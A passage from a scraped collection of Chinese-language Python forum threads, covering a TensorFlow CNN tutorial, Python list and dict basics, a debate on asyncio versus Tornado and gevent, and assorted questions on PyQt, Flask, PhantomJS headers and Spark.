x = tf.nn.dropout(x,dropout)\n    # Output, class prediction\n    x = tf.add(tf.matmul(x,weights['out']),biases['out'])\n    return x\n\n# Store layers weight &amp; bias\nweights = {\n    'wc1': tf.Variable(tf.random_normal([5, 5, 1, 16])),\n    'wc2': tf.Variable(tf.random_normal([5, 5, 16, 32])),\n    'wc3': tf.Variable(tf.random_normal([5, 5, 32, 64])),\n    # fully connected, 7*7*64 inputs, 1024 outputs\n    'wd1': tf.Variable(tf.random_normal([40*17*64, 1024])),\n    'out': tf.Variable(tf.random_normal([1024, n_classes]))\n}\n\nbiases = {\n    'bc1': tf.Variable(tf.random_normal([16])),\n    'bc2': tf.Variable(tf.random_normal([32])),\n    'bc3': tf.Variable(tf.random_normal([64])),\n    'bd1': tf.Variable(tf.random_normal([1024])),\n    'out': tf.Variable(tf.random_normal([n_classes]))\n}\n\n</code></pre>\n<pre><code>%%time\n# 模型优化\npred = CNN_Net_two(x,weights,biases,dropout=keep_prob)\ncost = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(pred,y))\noptimizer = tf.train.AdamOptimizer(learning_rate=learning_rate).minimize(cost)\ncorrect_pred = tf.equal(tf.argmax(pred,1),tf.arg_max(y,1))\n# tf.argmax(input,axis=None) 由于标签的数据格式是 -1 0 1 3 列，该语句是表示返回值最大也就是 1 的索引，两个索引相同则是预测正确。\naccuracy = tf.reduce_mean(tf.cast(correct_pred, tf.float32))\n# 更改数据格式，降低均值\ninit = tf.global_variables_initializer()\nwith tf.Session() as sess:\n    sess.run(init)\n    # for step in range(300):\n    for step in range(1):\n        for i in range(int(len(fac)/batch_size)):\n            batch_x = fac[i*batch_size:(i+1)*batch_size]\n            batch_y = ret[i*batch_size:(i+1)*batch_size]\n            sess.run(optimizer,feed_dict={x:batch_x,y:batch_y,keep_prob:dropout})\n            if i % 10 ==0:\n                print(i,'----',(int(len(fac)/batch_size)))\n        loss, acc = sess.run([cost, accuracy], feed_dict={x: batch_x,y: batch_y,keep_prob: 1.})\n        print(\"Iter \" + str(step*batch_size) + \", Minibatch Loss= \" + \\\n                  \"{:.6f}\".format(loss) + \", Training Accuracy= \" + \\\n                  \"{:.5f}\".format(acc))\n    print(\"Optimization Finished!\")   \n    sess.close()\n\n</code></pre>\n<p>5 层</p>\n<pre><code>def CNN_Net_five(x,weights,biases,dropout=0.8,m=1):\n    \n    x = tf.reshape(x, shape=[-1,40,17,1])\n    \n    # 卷积层 1\n    x = tf.nn.conv2d(x, weights['wc1'], strides=[1,m,m,1],padding='SAME')\n    x = tf.nn.bias_add(x,biases['bc1'])\n    x = tf.nn.relu(x)\n    \n    # 卷积层 2 \n    x = tf.nn.conv2d(x, weights['wc2'], strides=[1,m,m,1],padding='SAME')\n    x = tf.nn.bias_add(x,biases['bc2'])\n    x = tf.nn.relu(x)\n    \n    # 卷积层 3 \n    x = tf.nn.conv2d(x, weights['wc3'], strides=[1,m,m,1],padding='SAME')\n    x = tf.nn.bias_add(x,biases['bc3'])\n    x = tf.nn.relu(x)    \n    \n    # 卷积层 4 \n    x = tf.nn.conv2d(x, weights['wc4'], strides=[1,m,m,1],padding='SAME')\n    x = tf.nn.bias_add(x,biases['bc4'])\n    x = tf.nn.relu(x) \n    \n    # 卷积层 5 \n    x = tf.nn.conv2d(x, weights['wc5'], strides=[1,m,m,1],padding='SAME')\n    x = tf.nn.bias_add(x,biases['bc5'])\n    x = tf.nn.relu(x) \n    \n    # 全连接层\n    x = tf.reshape(x,[-1,weights['wd1'].get_shape().as_list()[0]])\n    x = tf.add(tf.matmul(x,weights['wd1']),biases['bd1'])\n    x = tf.nn.relu(x)\n    \n    # Apply Dropout\n    x = tf.nn.dropout(x,dropout)\n    # Output, class prediction\n    x = tf.add(tf.matmul(x,weights['out']),biases['out'])\n    return x\n\n# Store layers weight &amp; bias\nweights = {\n    'wc1': tf.Variable(tf.random_normal([5, 5, 1, 16])),\n    'wc2': tf.Variable(tf.random_normal([5, 5, 16, 32])),\n    'wc3': tf.Variable(tf.random_normal([5, 5, 32, 64])),\n    'wc4': tf.Variable(tf.random_normal([5, 5, 64, 32])),\n    'wc5': tf.Variable(tf.random_normal([5, 5, 32, 16])),\n    # fully connected, 7*7*64 inputs, 1024 outputs\n    'wd1': tf.Variable(tf.random_normal([40*17*16, 1024])),\n    'out': tf.Variable(tf.random_normal([1024, n_classes]))\n}\n\nbiases = {\n    'bc1': tf.Variable(tf.random_normal([16])),\n    'bc2': tf.Variable(tf.random_normal([32])),\n    'bc3': tf.Variable(tf.random_normal([64])),\n    'bc4': tf.Variable(tf.random_normal([32])),\n    'bc5': tf.Variable(tf.random_normal([16])),\n    'bd1': tf.Variable(tf.random_normal([1024])),\n    'out': tf.Variable(tf.random_normal([n_classes]))\n}\n\n</code></pre>\n<pre><code>%%time\n# 模型优化\npred = CNN_Net_five(x,weights,biases,dropout=keep_prob)\ncost = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(pred,y))\noptimizer = tf.train.AdamOptimizer(learning_rate=learning_rate).minimize(cost)\ncorrect_pred = tf.equal(tf.argmax(pred,1),tf.arg_max(y,1))\n# tf.argmax(input,axis=None) 由于标签的数据格式是 -1 0 1 3 列，该语句是表示返回值最大也就是 1 的索引，两个索引相同则是预测正确。\naccuracy = tf.reduce_mean(tf.cast(correct_pred, tf.float32))\n# 更改数据格式，降低均值\ninit = tf.global_variables_initializer()\n\nwith tf.Session() as sess:\n    sess.run(init)\n    for step in range(1):\n        for i in range(int(len(fac)/batch_size)):\n            batch_x = fac[i*batch_size:(i+1)*batch_size]\n            batch_y = ret[i*batch_size:(i+1)*batch_size]\n            sess.run(optimizer,feed_dict={x:batch_x,y:batch_y,keep_prob:dropout})\n            print(i,'----',(int(len(fac)/batch_size)))\n        loss, acc = sess.run([cost, accuracy], feed_dict={x: batch_x,y: batch_y,keep_prob: 1.})\n        print(\"Iter \" + str(step*batch_size) + \", Minibatch Loss= \" + \\\n                  \"{:.6f}\".format(loss) + \", Training Accuracy= \" + \\\n                  \"{:.5f}\".format(acc))\n    print(\"Optimization Finished!\") \n    sess.close()\n\n</code></pre>\n<p><strong>优化参数之后准确率大概在 94%+</strong></p>\n<p>该作者其他有关机器学习，深度学习方面的文章也推荐给大家，希望对大家有帮助：</p>\n<p>Tensorflow 笔记 1 CNN : <a href=\"https://uqer.io/community/share/58637c716a5e6d00522939b7\" rel=\"nofollow\">https://uqer.io/community/share/58637c716a5e6d00522939b7</a>\n<br>TensorFlow 笔记 2 双向 LSTM : <a href=\"https://uqer.io/community/share/586a4eb889e3ba004defde4b\" rel=\"nofollow\">https://uqer.io/community/share/586a4eb889e3ba004defde4b</a>\n<br>TensorFlow 笔记 3 多层 LSTM : <a href=\"https://uqer.io/community/share/586bb68423a7d60052a361f6\" rel=\"nofollow\">https://uqer.io/community/share/586bb68423a7d60052a361f6</a>\n<br>三个臭皮匠-集成算法框架上手 : <a href=\"https://uqer.io/community/share/58562a9f6a5e6d0052291ebe\" rel=\"nofollow\">https://uqer.io/community/share/58562a9f6a5e6d0052291ebe</a></p>\n</div></div>"], "reply": "1", "tittle": "Tensorflow 笔记 用 CNN 做预测", "comment": ["顶一下"]},
{"content": ["<div class=\"topic_content\">效果大概是这样:\r<br>\r<br><a target=\"_blank\" href=\"http://chuantu.biz/t5/45/1484034631x3055758535.jpg\" rel=\"nofollow\">http://chuantu.biz/t5/45/1484034631x3055758535.jpg</a>\r<br>\r<br>在 QT 的栗子里找到 Qt 的动画部分，稍加改造可以实现切换时的动态效果，但是没有立体的感觉。\r<br>\r<br>:) 大家有没有 PYQT/QT 的动画部分的书推荐。\r<br>\r<br>看了帖子https://www.v2ex.com/t/74249?p=2\r<br>\r<br>图片不是直接贴网址就好吗。。好像没成功。</div>"], "reply": "3", "tittle": "PYQT5 如何创建图片轮播。", "comment": ["用 qml 的 pathview 很快就做出来了", " 谢谢，查到资料 qml 比较适合做这些，有个问题 qml 写的能不能与 QWidget 融合，试了试 QT 自带的 qml 栗子，好像没法将 qml 生成的窗口写在 QWidget 里，只能作为一个独立的窗口。", " 可以混合使用的， qml 很多东西本来就是 c++封装的， qml 和 c++可以互相调用，你要用 QWidget 来做， qml 的内容包含在一个容器里面就行了"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://buyiker.com/\" rel=\"nofollow\">http://buyiker.com/</a></div>"], "reply": "8", "tittle": "我 的小网站，里面有些算法实现 ， 有问题可以联系我！", "comment": ["给你个建议。我觉得你应该把 fork me on gayhub 的 position 设置为 fixed.", " 对 css 不了解， thx", "没有 atom/feed ?", "其实 fork me 可以滚走也很好，毕竟只是提供一个入口，想 fork 的人自然会去，一直留在页面上有点烦。", "这是我的网站  ", "后台文章编辑器用什么实现的呢", " 我不是前端 ， 弄了一个小东西 ；我是一个数据后端，可以忽略我前端的技术", " 用 github 写的 ，用 markdown 写出来的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有人遇到过么\n很简单的一个表单上传文件功能，起来之后不停的上传文件，然后内存不停的上涨，上传停止之后也没有下降。</p>\n</div></div>"], "reply": "2", "tittle": "flask memory leak", "comment": ["很简单，你代码写的有问题", "检查 flask 这方面的实现有没有引起环或者其他不能使得内存正常回收的写法"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>列表(list)同字符串一样都是有序的，因为他们都可以通过切片和索引进行数据访问，且列表的的是可变的。</p>\n<h2>创建列表的几种方法</h2>\n<p>第一种</p>\n<pre><code>name_list = ['Python', 'PHP', 'JAVA']\n</code></pre>\n<p>第二种</p>\n<pre><code>name_list ＝ list(['Python', 'PHP', 'JAVA'])\n</code></pre>\n<p>创建一个空列表</p>\n<pre><code>&gt;&gt;&gt; li = list() \n&gt;&gt;&gt; type(li)\n&lt;class 'list'&gt;\n</code></pre>\n<p>把一个字符串转换成一个列表</p>\n<pre><code>&gt;&gt;&gt; var=\"abc\"\n&gt;&gt;&gt; li = list(var)\n&gt;&gt;&gt; li\n['a', 'b', 'c']\n</code></pre>\n<p>list 在把字符串转换成列表的时候，会把字符串用 for 循环迭代一下，然后把每个值当作 list 的一个元素。</p>\n<p>把一个元组转换成列表</p>\n<pre><code>&gt;&gt;&gt; tup=(\"a\",\"b\",\"c\")\n&gt;&gt;&gt; li=list(tup)\n&gt;&gt;&gt; type(li)\n&lt;class 'list'&gt;\n&gt;&gt;&gt; li\n['a', 'b', 'c']\n</code></pre>\n<p>把字典转换成列表</p>\n<pre><code>&gt;&gt;&gt; dic={\"k1\":\"a\",\"k2\":\"b\",\"k3\":\"c\"}\n&gt;&gt;&gt; li=list(dic)\n&gt;&gt;&gt; type(li)\n&lt;class 'list'&gt;\n&gt;&gt;&gt; li\n['k3', 'k1', 'k2']\n</code></pre>\n<p>字典默认循环的时候就是 key ，所以会把 key 当作列表的元素</p>\n<pre><code>&gt;&gt;&gt; dic={\"k1\":\"a\",\"k2\":\"b\",\"k3\":\"c\"}\n&gt;&gt;&gt; li=list(dic.values())\n&gt;&gt;&gt; li\n['c', 'a', 'b']\n</code></pre>\n<p>如果指定循环的是 values ，那么就会把 values 当作列表的元素</p>\n<h3>列表所提供的方法</h3>\n<p>在列表末尾添加新的对象</p>\n<blockquote>\n<p>append(self, p_object):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; name_list = ['Python', 'PHP', 'JAVA']\n&gt;&gt;&gt; name_list.append(\"C#\")\n&gt;&gt;&gt; name_list\n['Python', 'PHP', 'JAVA', 'C#']\n</code></pre>\n<p>统计某个元素在列表中出现的次数</p>\n<blockquote>\n<p>count(self, value):</p>\n</blockquote>\n<p>|属性|描述|\n|:--|:--|\n|obj|列表中统计的对象|</p>\n<pre><code>&gt;&gt;&gt; name_list = ['Python', 'PHP', 'PHP']\n&gt;&gt;&gt; name_list.count(\"PHP\")\n2\n</code></pre>\n<p>用于在列表末尾一次性追加另一个序列中的多个值</p>\n<blockquote>\n<p>extend(self, iterable):</p>\n</blockquote>\n<p>|属性|描述|\n|:--|:--|\n|seq|元素列表|</p>\n<pre><code>&gt;&gt;&gt; name_list = ['Python', 'PHP', 'Python']\n&gt;&gt;&gt; name_OS = ['Windows', 'Linux', 'Unix']\n&gt;&gt;&gt; name_list\n['Python', 'PHP', 'Python']\n&gt;&gt;&gt; name_OS\n['Windows', 'Linux', 'Unix']\n# 把列表`name_OS`中的内容添加到`name_list`的尾部\n&gt;&gt;&gt; name_list.extend(name_OS)\n# 输出的结果\n&gt;&gt;&gt; name_list\n['Python', 'PHP', 'Python', 'Windows', 'Linux', 'Unix']\n</code></pre>\n<p>从列表中找出某个值第一个匹配项的索引位置</p>\n<blockquote>\n<p>index(self, value, start=None, stop=None):</p>\n</blockquote>\n<p>|属性|描述|\n|:--|:--|\n|value|列表中统计的对象|</p>\n<pre><code># 查找对象所在的位置\n&gt;&gt;&gt; name_list = ['Python', 'PHP', 'JAVA']\n&gt;&gt;&gt; name_list.index(\"PHP\")\n1\n</code></pre>\n<p>将指定对象插入列表</p>\n<blockquote>\n<p>insert(self, index, p_object):</p>\n</blockquote>\n<p>|属性|描述|\n|:--|:--|\n|index|对象 obj 需要插入的索引位置|\n|obj|要出入列表中的对象|</p>\n<pre><code>&gt;&gt;&gt; name_list = ['Python', 'PHP', 'JAVA']\n# 把位置`1`的内容换成`C`，后面的自动退格一个位置\n&gt;&gt;&gt; name_list.insert(1,\"C\")\n&gt;&gt;&gt; name_list\n['Python', 'C', 'PHP', 'JAVA']\n</code></pre>\n<p>移除列表中的一个元素，并且返回该元素的值</p>\n<blockquote>\n<p>pop(self, index=None):</p>\n</blockquote>\n<p>|属性|描述|\n|:--|:--|\n|index|可选参数，要移除列表元素的位置|</p>\n<pre><code>&gt;&gt;&gt; name_list = ['Python', 'PHP', 'JAVA']\n# 删除位置 1 上面的内容，并且返回删除的字符串\n&gt;&gt;&gt; name_list.pop(1)\n'PHP'\n&gt;&gt;&gt; name_list\n['Python', 'JAVA']\n</code></pre>\n<p>移除列表中某个值的第一个匹配项</p>\n<blockquote>\n<p>remove(self, value):</p>\n</blockquote>\n<p>|属性|描述|\n|:--|:--|\n|value|列表中要移除的对象|</p>\n<pre><code>&gt;&gt;&gt; name_list = ['Python', 'PHP', 'JAVA', 'Python']\n# 每次删除的时候只会把第一次匹配到的值删除，第二个值不会被删除\n&gt;&gt;&gt; name_list.remove(\"Python\")\n&gt;&gt;&gt; name_list\n['PHP', 'JAVA', 'Python']\n&gt;&gt;&gt; name_list.remove(\"Python\")\n&gt;&gt;&gt; name_list\n['PHP', 'JAVA']\n</code></pre>\n<p>当然删除元素还可以直接使用<code>del</code>进行删除：</p>\n<pre><code>&gt;&gt;&gt; L = [1,2,3]\n&gt;&gt;&gt; del L[1]\n&gt;&gt;&gt; L\n[1, 3]\n</code></pre>\n<p>又或者使用切片赋值进行元素删除</p>\n<pre><code>&gt;&gt;&gt; L = [1,2,3]\n&gt;&gt;&gt; L[1:2] = []\n&gt;&gt;&gt; L\n[1, 3]\n</code></pre>\n<p>反向输出列表中的元素</p>\n<blockquote>\n<p>reverse(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; name_list = ['Python', 'PHP', 'JAVA']\n&gt;&gt;&gt; name_list\n['PHP', 'JAVA', 'Python']\n&gt;&gt;&gt; name_list.reverse()\n&gt;&gt;&gt; name_list\n['JAVA', 'PHP', 'Python']\n</code></pre>\n<p>对原列表进行排序，如果指定参数，则使用比较函数指定的比较函数</p>\n<blockquote>\n<p>sort(self, cmp=None, key=None, reverse=False):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; name_list = ['Python', 'PHP', 'JAVA']\n&gt;&gt;&gt; name_list\n['Python', 'PHP', 'JAVA']\n&gt;&gt;&gt; name_list.sort()\n&gt;&gt;&gt; name_list\n['JAVA', 'PHP', 'Python']\n</code></pre>\n<p>清除列表内所有元素</p>\n<pre><code>&gt;&gt;&gt; li\n['Ansheng']\n&gt;&gt;&gt; li.clear()\n&gt;&gt;&gt; li\n[]\n</code></pre>\n<p>同字符串一样，列表也支持解析，称为列表解析</p>\n<pre><code>&gt;&gt;&gt; li = [x for x in range(1,20)]\n&gt;&gt;&gt; li\n[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19]\n</code></pre>\n<hr>\n<p><a href=\"https://blog.ansheng.me/article/python-full-stack-way-list-data-type/\" rel=\"nofollow\">原文链接</a></p>\n<hr>\n<p><a href=\"https://blog.ansheng.me/article/python-full-stack-way/\" rel=\"nofollow\">Python 全栈之路系列文章</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Python 全栈之路系列之列表数据类型", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>关于这个, 大家有什么看法? Tornado有什么优势是目前Py3原生coroutine没有的?</p>\n<p>PS: 本人水平比较渣, 本帖子是请教, 不是开炮. 另外 Tornado 的 web 框架不做重点讨论, 只是他的 coroutine 部分.</p>\n<p>谢谢了</p>\n</div></div>", "<div class=\"topic_content\">谢谢各位的指点, 为免水了这个页面, 我就不在下面一一回复致谢了.</div>"], "reply": "37", "tittle": "Python 3.4/3.5/3.6 的 coroutine 日渐成熟之后, Tornado 之类的异步框架是不是会逐渐没落? (非 web)", "comment": ["tornado 支持新的写法。是目前最高级的异步框架了。\r", "\r", "asyncio 的框架目前还没有怪兽型的出来统一江湖。\r", "\r", "twisted gevent 这类是正在淘汰的。", "asyncio 本身好难用\r", "\r", "只是看语法的话，我还以为 gevent 是原生方法呢\r", "就像 jQ 之余 JS 一样，虽然 JS 原生越来越强大，但是 JQ 用起来更快捷方便啊。\r", "\r", "并且 python 原生异步方法的进步也可以提升 gevent 以及 tornado 的性能，使他们内部实现更高效简单，这是个双赢过程。", "asyncio 确实难用\r", "\r", "现在用上这个特性比较出名的 web 框架，也就 sanit 了", "我还以为是我菜才觉得 asyncio 难用，看了这个帖子我放心了。", "最近在用 aiohttp ，实话说，感觉优雅，就是扩展太少。", "不是很明白 asyncio 难用在哪个地方呢？因为太底层了缺少一些上层封装？", "我记得 Ben Darnell 来 pycon China 的时候提过考虑将底层 event loop 替换成 asyncio", "Tornado 可以直接使用 asyncio\r", "\r", "只需要 AsyncIOMainLoop().install()", "什么时候出来一个成熟强大的异步 ORM ？", "重要的是数据库驱动要支持异步", " ORM 和 异步 天然互斥", " 为啥会天然排斥啊？我不是很明白 orz", "twisted 没落就算了, gevent 我觉得还是挺好的,asyncio 应该不能完全替代吧?", " 其实 asyncio 也有替代品，可以用 uvloop 和 curio 来代替的", "gevent 可以再战 200 年。\r", "\r", "从性能和写法上来说都是最优解。\r", "\r", "不服罚抄 twisted 100 遍。", "算是对 Tornado 粉转黑, 一个框架好不好并不仅仅在于框架本身, 更要在于周围的环境和中间件, 比如现在还没有好的数据库 driver, 即使有些是异步, 也并不适用于生产环境. 另一个 Torando 进行模块化设计时十分不美观 你需要在所有的子函数都加上异步装饰器, 其实说白了还是用的人少, 深入研究的人少, 导致周边环境不是很好.", " Motor ？", "同步的代码比异步的好写，坑少，逻辑更容易理解，对性能要求不高的没必要异步。对性能要求高的，可能会用 gevent ， asyncio 这些异步库，也可能会用 c, rust 这些语言实现。但是 asyncio 太底层了，概念超级多，直接用太复杂了，但进了标准库说明它足够优秀，灵活性和可拓展性是别的轮子没法比的，估计 1~2 年内就会有成熟框架出现。", " 嗯， Motor 不合适， nodejs 中的 Sequelize ？", "本机 io 其实 asyncio 挺好用的。 aiohttp 写个小爬虫也挺方便。\r", "\r", "web 框架方面，应该和 tornado 合力发展，两个都会变强。\r", "\r", "得等异步数据库发展，等 django 这类的东西自然被淘汰掉， aio 的 web 框架才会 nb 吧。", "python3.5 引入的 async/await 是新语法，新语法在 tornado 上也可以用。\r", "至于从 python3.4 引入的 asyncio 标准库，也存在一些问题，比如学习曲线陡峭、解决不了 backpressure 这样的网络问题。 ", " twisted 被淘汰这我承认,因为写起来确实恶心,但是 gevent 被淘汰我不知道你是从哪里得出来的结论,gevent 这种应该说是最适合网络编程的,侵入性最小,如果你把一份同步的代码移植到 asyncio 或者 tornado 你就知道 gevent 的好了,在网络编程的场景,协程的切换基本都发生在阻塞 io 的时候,这就应该用库来帮你自动切换,而不是用一些 yield,await 之流的东西. 因此写网络应用程序的时候我个人是更喜欢 gevent. 而且现在我也没看到 gevent 有没落的迹象", " ", " SQL Alchemy 作者写的", " 谢啦，我去看看", "asyncio 只是一眼看上去比较难而已，真要学的话一两天就很熟了， tornado 市场肯定会越来越小", "异步只在并发超级多的时候才特别有意义，绝大多数情况下用 Future 线程池更好，，", " yield ， await 跟 gevent 没有本质的差异， gevent 你觉得不用手动切换那是你 monkeypatch 了然后 gevent 将底层 socket api 全部给你换了。这样带来一个问题就是，我压根就不知道现在我用的库支不支持 gevent monkeypatch ，隐式替代会给程序带来不可控。\r", "\r", "在我看来拿 asyncio 跟 Tornado 比都是耍流氓。 Tornado 就一个网络框架， asyncio 是一个网络库。两者要干的事情压根就不一样。 asyncio 更多是一个接口规范，虽然自带一个实现。单用 asyncio ，应用层协议就可以自动解析？不能自动解析的话，那么比什么？", "在公司用了 tornado 两年多了，和同步比起来确实有很多坑，但伸缩性更强确实是优点，没有 orm 支持确实是个麻烦，但换个方面想， coroutine 确实不怎么快，如果配合 orm 做很重的过程的话说起来和同步相比谁性能更高还不一定呢", "gevent 比 tornado 优雅得多", " 可以不 monkeypatch,直接 import gevent 里的东东好了", "为什么 monkeypatch 前面的 m 会断开?", "  @", " \r", "异步 orm 有啊 比如 ", "\r", "配合 Tornado 妥妥的", " ok ，那么问题来什么都要从 socket api 写起的话，那么我身为一个库的作者，为什么不依赖标准库而要用 gevent ？而且两者的效率是一样的，开发效率也是一样的。根据现在的 asyncio ，它还可以换 uvloop 来提高性能，虽然我认为都是人们在乱 benchmark 而已。", "当然挺大 asyncio\r", "asyncio 是标准库你们想什么呢，关于异步相关的操作和规范都朝着 asyncio 制定的， tornado 等其他框架只能效仿，没出来前 gevent tornado 什么的各搞各的， asyncio 作为标准库这是 python 异步 IO 的官方范本，楼上说的什么 tornado 也可以用 asyncio 啥的，这是把 tornado 当成纯粹的应用层的框架了吧，这个 tornado 毫无优势啊。\r", "\r", "异步的数据库驱动坑多收益少，不如直接线程池，访问密集的地方，你真的会直接敢把流量打到数据库上吗？考虑异步数据库驱动的你真的需要吗？", " django 肯定是活得最长的 python 的 web 框架啊，想什么呢？", "那么异步访问数据库的问题何解？", " 即使是显示的替换也能减少工作量\r", "另外 asyncio 我还没怎么用过,但看 api 感觉有点乱,gevent 的接口比较自然,当然 asyncio 作为标准库本身是有优势的,就看个人选择了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"1\" src=\"http://ww3.sinaimg.cn/large/bf8b06edgw1fblv5nuw7rj21kw0ydqh6.jpg\"></p>\n<p><img alt=\"2\" src=\"http://ww1.sinaimg.cn/large/bf8b06edgw1fblv5lur2uj21kw0xc4cp.jpg\"></p>\n<p>好恐怖的感觉。。。</p>\n</div></div>"], "reply": "4", "tittle": "pip 官网怎么了", "comment": ["Norton Rating\r", "\r", "Safeweb Share\r", "Norton Safe Web has analyzed ", " for safety and security problems.\r", "Summary\r", "\r", "Norton Safe Web found no issues with this site.\r", "Computer Threats: 0\r", "Identity Threats: 0\r", "Annoyance factors: 0\r", "Total threats on this site: 0", "最近也是 pip 安装总是 time out ，换了豆瓣的源可以用了。", " 感觉被墙过一样的速度", "不是一直都这样么？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>发现以前修改 Phantomjs 的头部代码都不能用，辛苦找的，记录一下帮助更多人（注意 python 缩进）</p>\n<p>2016 年 11 月 6 号测试有效(python 2.7   Phantomjs 2.11)</p>\n<pre><code>这是一个代码区块。\n\nfrom selenium import webdriver\n\nfrom selenium.webdriver import DesiredCapabilities\n\ndriver=webdriver.PhantomJS(executable_path='存放路径\\phantomjs.exe')\n\ndesired_capabilities= DesiredCapabilities.PHANTOMJS.copy()\n\nheaders = {'Accept': '*/*',\n\n'Accept-Language': 'en-US,en;q=0.8',\n\n'Cache-Control': 'max-age=0',\n\n'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36',#这种修改 UA 也有效\n\n'Connection': 'keep-alive'\n\n'Referer':'http://www.baidu.com/'\n\n}\n\nfor key, value in headers.iteritems():\n\n    desired_capabilities['phantomjs.page.customHeaders.{}'.format(key)] = value\n\ndesired_capabilities['phantomjs.page.customHeaders.User-Agent'] ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'\n\ndriver= webdriver.PhantomJS(desired_capabilities=desired_capabilities)\n\ndriver.get(\"http://www.myip.cn/judge.php\")\n\nprint driver.page_source\n\n</code></pre>\n<p>参考： <a href=\"https://gist.github.com/ozen/e24c4d40b53a774d9b36\" rel=\"nofollow\">https://gist.github.com/ozen/e24c4d40b53a774d9b36</a></p>\n</div></div>", "<div class=\"topic_content\">感谢 @<a target=\"_blank\" href=\"/member/terence44\">terence44</a> 提醒 \r<br>上面代码有点小错误，\r<br>正确的为\r<br>\r<br>第三行 \r<br>driver=webdriver.PhantomJS(executable_path='存放路径\\phantomjs.exe')\r<br>删除\r<br>\r<br>倒数第三行修改为\r<br>driver=webdriver.PhantomJS(executable_path='存放路径\\phantomjs.exe'， desired_capabilities=desired_capabilities)</div>"], "reply": "7", "tittle": "分享 Python+Webdriver+Phantomjs,设置自定义 headers 的方法", "comment": ["调 2 次 webdriver.PhantomJS 是不是有点不太对？\r", "driver=webdriver.PhantomJS(executable_path='存放路径\\phantomjs.exe'， desired_capabilities=desired_capabilities)\r", "怎么样？", "\r", "忘了当时怎么想的了，当时没报错。我也觉得可以缩写成你写的，  你测试一下可用不", " 好的 回头我试一下再来", " 试了一下你的代码会报错，又试了一下我的，虽然没报错但看不出来有没有用。目前没有指定 header 的页面，现在正在搞别的东西，等有空了搞一下试试，感谢分享。", "\r", "访问 ", "  查看 headers 的值。\r", "搜索了一下，如你所说 。\r", "第三行 \r", "driver=webdriver.PhantomJS(executable_path='存放路径\\phantomjs.exe')\r", "删除\r", "\r", "倒数第三行修改为\r", "driver=webdriver.PhantomJS(executable_path='存放路径\\phantomjs.exe'， desired_capabilities=desired_capabilities)", "remote 的用不了吧？", "  remote 的没用过  你看着改改试试"]},
{"content": ["<div class=\"topic_content\">没思路啊。比如我在前端提交一个算法，怎么异步去启动 spark 开始运算，最后把运算完成通知后台最后在前端显示出来的？\r<br>有达人来提点下思路么？</div>"], "reply": "目前尚无回", "tittle": "大家是怎么把 web app 跟 spark 结合起来的？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>字典(dict)在基本的数据类型中使用频率也是相当高的，而且它的访问方式是通过键来获取到对应的值，当然存储的方式也是<code>键值</code>对了，属于可变类型。</p>\n<h2>创建字典的两种方式</h2>\n<p>第一种</p>\n<pre><code>&gt;&gt;&gt; dic = {\"k1\":\"123\",\"k2\":\"456\"}\n&gt;&gt;&gt; dic\n{'k1': '123', 'k2': '456'}\n&gt;&gt;&gt; type(dic)\n&lt;class 'dict'&gt;\n</code></pre>\n<p>第二种</p>\n<pre><code>&gt;&gt;&gt; dic = dict({\"k1\":\"123\",\"k2\":\"456\"})\n&gt;&gt;&gt; dic\n{'k1': '123', 'k2': '456'}\n&gt;&gt;&gt; type(dic)\n&lt;class 'dict'&gt;\n</code></pre>\n<p>在创建字典的时候，<code>__init__</code>初始化的时候还可以接受一个可迭代的变量作为值</p>\n<pre><code>&gt;&gt;&gt; li = [\"a\",\"b\",\"c\"]\n&gt;&gt;&gt; dic = dict(enumerate(li))\n&gt;&gt;&gt; dic\n{0: 'a', 1: 'b', 2: 'c'}\n</code></pre>\n<p>默认 dict 再添加元素的时候会把 li 列表中的元素 for 循环一边，添加的时候列表中的内容是字典的值，而键默认是没有的，可以通过 enumerate 方法给他加一个序列，也就是键。</p>\n<p>与其变量不同的是，字典的键不仅仅支持字符串，而且还支持其他数据类型，譬如：</p>\n<pre><code># 数字\n&gt;&gt;&gt; D = {1:3}\n&gt;&gt;&gt; D[1]\n3\n# 元组\n&gt;&gt;&gt; D = {(1,2,3):3}\n&gt;&gt;&gt; D[(1,2,3)]\n3\n</code></pre>\n<p>字典解析</p>\n<pre><code>&gt;&gt;&gt; D = {x: x*2 for x in range(10)}\n&gt;&gt;&gt; D\n{0: 0, 1: 2, 2: 4, 3: 6, 4: 8, 5: 10, 6: 12, 7: 14, 8: 16, 9: 18}\n# 可以使用 zip\n&gt;&gt;&gt; D = {k:v for (k, v) in zip(['a','b','c'],[1,2,3])}\n&gt;&gt;&gt; D\n{'a': 1, 'c': 3, 'b': 2}\n</code></pre>\n<h2>字典所提供的常用方法</h2>\n<p>删除字典中的所有元素</p>\n<blockquote>\n<p>clear(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person = dict({\"name\": \"ansheng\", 'age': 18})\n&gt;&gt;&gt; person\n{'age': 18, 'name': 'ansheng'}\n&gt;&gt;&gt; person.clear()\n# 清空字典的内容之后字典会变成一个空字典\n&gt;&gt;&gt; person\n{}\n</code></pre>\n<p>返回一个字典的浅复制</p>\n<blockquote>\n<p>copy(self):</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; person = dict({\"name\": \"ansheng\", 'age': 18})\n&gt;&gt;&gt; person.copy()\n{'age': 18, 'name': 'ansheng'}\n</code></pre>\n<p>创建一个新字典，以序列 seq 中元素做字典的键， value 